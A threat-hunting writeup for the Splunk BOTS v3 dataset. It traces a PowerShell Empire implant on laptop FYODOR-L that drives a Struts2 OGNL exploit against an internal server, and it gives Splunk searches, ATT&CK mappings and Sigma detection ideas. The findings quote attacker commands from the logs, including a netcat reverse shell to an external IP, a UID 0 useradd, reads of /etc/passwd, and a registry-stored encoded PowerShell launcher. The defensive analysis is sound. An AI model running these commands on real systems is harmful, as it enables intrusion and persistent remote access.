# Investigation 2 — Endpoint compromise and Struts2 attack from FYODOR-L

Dataset: Splunk BOTS v3. Endpoint telemetry is Sysmon (`sourcetype=XmlWinEventLog` after
the Splunk Add-on for Sysmon renames it), with network connections in Sysmon EventCode 3.
Scenario: one Frothly laptop is running an implant and is used to attack an internal
application server. This writeup traces the host side: the malicious binary, the attack it
drives, how the implant persists and elevates, and its command-and-control.

Set the time range to **All time** for every search (data is from August 2018).

> Data note: the BOTS v3 Sysmon events are XML and the dataset indexes them under a
> lowercase sourcetype that the official add-on does not extract from. Field extraction
> here comes from a small local app (`splunk/TA-botsv3-sysmon-extract`) that binds to the
> renamed `XmlWinEventLog` sourcetype and pulls Sysmon fields from the raw XML. See
> `docs/splunk-setup.md`.

## Summary

The intrusion runs on **FYODOR-L**, user **AzureAD\FyodorMalteskesko**, on 2018-08-20 from
about 11:05. A PowerShell Empire implant on the laptop launches a masquerading binary,
`iexeplorer.exe`, from `C:\Windows\Temp\unziped\lsof-master\`. That binary is a Struts2
exploit client. It sends OS commands to the internal server `192.168.9.30:8080`
(the `frothlyinventory` application) through the OGNL `.action` endpoint. The operator runs
reconnaissance, creates a UID 0 account on the target, stages and compiles a C source file,
and opens a reverse shell from the target to an external host. On the laptop itself the
implant holds persistence through a fake registry key, a scheduled task, and WMI, elevates
with a fodhelper UAC bypass, beacons to `45.77.53.176`, and runs an internal port scanner.

| Time (UTC, 2018-08-20) | Where | Action |
|---|---|---|
| ~11:05 | FYODOR-L | Hidden encoded PowerShell (Empire) launches `iexeplorer.exe` |
| 11:05-11:34 | 192.168.9.30 | Struts2 commands: recon, `useradd` UID 0, drop and compile `colonel.c`, reverse shell |
| across the window | FYODOR-L | `powershell.exe` beacons to `45.77.53.176:443` (3,849 connections) |
| across the window | FYODOR-L | `hdoor.exe` scans 192.168.9.20/.25/.26/.30 on ports 22, 80, 443, 3306, 8000 |

Command-and-control host: **45.77.53.176** (443 beacon, 3333, and 8088 for the target's
reverse shell). Struts2 target: **192.168.9.30:8080**.

## Questions

### Q1. Which endpoint runs a suspicious binary, and what is it?

```spl
index=botsv3 sourcetype=XmlWinEventLog EventCode=1
| stats count by Image
| sort - count
```

Finding: among normal system binaries, one stands out:
`C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe` (34 executions). Two signals at once.
The path is under `C:\Windows\Temp\`, where legitimate software rarely runs from, inside an
`unziped\lsof-master` folder that looks like extracted download content. The name
`iexeplorer.exe` imitates Internet Explorer (`iexplore.exe`) with an extra letter, a
masquerade (T1036.005). All executions are on FYODOR-L, user AzureAD\FyodorMalteskesko.

### Q2. What did the attacker do through this binary?

```spl
index=botsv3 sourcetype=XmlWinEventLog EventCode=1 Image="*iexeplorer.exe"
| table _time host User ParentImage ParentCommandLine CommandLine
| sort _time
```

Finding: every command line follows the pattern
`"...iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action <command>`.
This is an Apache Struts2 exploit client (OGNL injection against a `.action` endpoint,
consistent with CVE-2017-5638). The `<command>` runs on the target, a Linux host, in order:

- Reconnaissance: `whoami`, `id`, `groups`, `cat /etc/passwd`, `uname -a`, `lsb_release -a`, `ls -lf /tmp`
- Account creation: `useradd -ou 0 -g 0 -M -N -r -s /bin/bash tomcat7 -p ...`, a UID 0 (root-equivalent) account
- Exploit staging: `echo <base64>`, `base64 --decode /tmp/colonel > /tmp/colonel.c`, `cat /tmp/colonel.c`, `md5sum /tmp/colonel.c`, a C source file dropped and compiled, consistent with a local privilege-escalation exploit
- Reverse shell: `mknod /tmp/backpipe p` then `/bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe`

So the laptop drives a full remote-code-execution chain against the internal server:
recon, persistence, privilege escalation, and an egress channel to an external host.

### Q3. How does the implant persist and elevate on the laptop?

```spl
index=botsv3 sourcetype=XmlWinEventLog EventCode=1 host=FYODOR-L Image="*powershell.exe"
| stats count values(ParentImage) as parent earliest(_time) as first by ParentCommandLine
| sort first
```

Finding: the PowerShell on FYODOR-L is launched several ways, each a known technique:

- `powershell -noP -sta -w 1 -enc <base64>`: a PowerShell Empire stager
- `$x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x`: the payload is read from a fake `Windows Update` registry value and run (persistence, T1112 / T1547)
- parent `fodhelper.exe`: a UAC bypass that runs the implant at high integrity without a prompt (T1548.002)
- parent `svchost.exe -k netsvcs ... Schedule`: a scheduled task runs PowerShell (T1053.005)
- parent `wmiprvse.exe`: WMI-based execution (T1047)
- parent `browser_broker.exe -Embedding`: a browser context, consistent with initial access through the browser

### Q4. What is the command-and-control and internal scanning activity?

```spl
index=botsv3 sourcetype=XmlWinEventLog EventCode=3 host=FYODOR-L
| stats count by Image DestinationIp DestinationPort
| sort - count
```

Finding: the network side confirms the host behavior.

- `powershell.exe` to `45.77.53.176:443`, 3,849 connections: the Empire C2 beacon. The same host also appears on `:3333`, and the target's reverse shell in Q2 connects to `:8088`
- `iexeplorer.exe` to `192.168.9.30:8080` (17) and `chrome.exe` to the same (34): the Struts2 target, reached by both the tool and the browser
- `C:\Windows\Temp\hdoor.exe` to `192.168.9.20`, `.25`, `.26`, `.30` on ports 22, 80, 443, 3306, 8000: an internal port scanner, mapping the subnet for follow-on movement (T1046)

## ATT&CK techniques observed

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | Struts2 OGNL commands to 192.168.9.30 `frothlyinventory/showcase.action` |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Hidden encoded PowerShell (Empire) on FYODOR-L |
| Execution | Windows Management Instrumentation | T1047 | `wmiprvse.exe` spawns PowerShell |
| Persistence | Scheduled Task | T1053.005 | `svchost ... Schedule` spawns PowerShell |
| Persistence / Defense Evasion | Modify Registry | T1112 | Payload stored in fake `HKCU\...\Windows Update` value |
| Privilege Escalation | Abuse Elevation Control: Bypass UAC | T1548.002 | `fodhelper.exe` spawns hidden PowerShell |
| Defense Evasion | Masquerading: Match Legitimate Name | T1036.005 | `iexeplorer.exe` imitating `iexplore.exe`, run from Temp |
| Discovery | Network Service Discovery | T1046 | `hdoor.exe` scans 192.168.9.0/24 across common ports |
| Persistence | Create Account (on target) | T1136 | `useradd` UID 0 `tomcat7` on 192.168.9.30 |
| Command and Control | Application Layer Protocol | T1071.001 | PowerShell beacon to 45.77.53.176:443 |

## Detection ideas

Behaviours from this investigation turned into Sigma rules in `detections/`:

- Encoded PowerShell with a hidden window and no profile (`win_powershell_encoded_hidden.yml`)
- A process image running from a Windows Temp path (`win_exec_from_windows_temp.yml`)
- `fodhelper.exe` spawning a shell (`win_fodhelper_uac_bypass.yml`)

Further ideas, left for later because they need network data or a baseline: PowerShell making
outbound connections to a non-RFC1918 address (the C2 beacon), and one internal host
connecting to many hosts or ports in a short window (the `hdoor.exe` scan).
